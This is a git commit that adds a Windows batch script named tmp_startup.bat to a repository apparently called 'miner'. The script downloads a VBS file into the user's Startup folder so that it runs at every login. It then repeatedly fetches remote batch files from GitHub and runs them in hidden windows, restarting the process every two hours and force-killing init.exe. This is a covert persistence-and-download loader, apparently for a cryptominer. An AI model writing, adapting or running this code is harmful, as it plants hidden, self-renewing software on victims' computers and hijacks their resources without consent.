d4f0da18bf2bf4b7c71ae36b508e8a165695ad05
nmshare <128151412+nmshare@users.noreply.github.com>
2023-04-16 14:16:13 +0300

    Create tmp_startup.bat

---
+++ tmp_startup.bat
@@ -0,0 +1,9 @@
+powershell curl -o "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\start.vbs" https://raw.githubusercontent.com/nmshare/miner/main/startup.vbs; New-item C:\temp\start.bat; Set-Content -Path "C:\temp\start.bat" -Value "powershell curl -o C:\temp\scr.bat https://raw.githubusercontent.com/nmshare/miner/main/startup.bat; start-process C:\temp\scr.bat -windowStyle Hidden
+:start
+del C:\temp\temp.bat
+curl -o C:\temp\temp.bat https://raw.githubusercontent.com/nmshare/miner/main/start.bat
+powershell start-process C:\temp\temp.bat -windowStyle Hidden
+echo "process started successfully"
+timeout /t 7200
+taskkill /f /im init.exe
+goto start
